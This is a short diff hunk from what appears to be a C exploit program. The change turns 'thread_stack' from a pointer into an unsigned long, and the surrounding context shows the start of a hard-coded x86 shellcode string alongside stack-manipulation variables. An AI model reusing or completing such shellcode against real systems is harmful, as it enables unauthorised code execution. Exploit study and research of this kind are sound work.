@@ -28,9 +28,9 @@ int main(int argc, char **argv) {
 
   int ret, wstatus;
   pid_t pid;
+  unsigned long thread_stack;
   struct utsname uts;
   char *pcall;
-  char *thread_stack;
   char *shadow_stack;
   char *shellcode = "\x33\xf6\x33\xdb\x43\x43\x33\xc9"
                     "\x41\x41\x33\xd2\x83\xc2\x06\x56"
